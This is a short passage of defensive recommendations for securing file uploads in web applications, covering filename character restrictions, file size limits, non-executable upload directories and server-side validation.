- If there is no need to have Unicode characters, it is highly recommended to only accept alpha-numeric characters and only one dot as an input for the file name and the extension.
- Limit the file size to a maximum value in order to prevent denial of service attacks.
- Uploaded directory should not have any "execute" permission.
- Don't rely on client-side validation only.
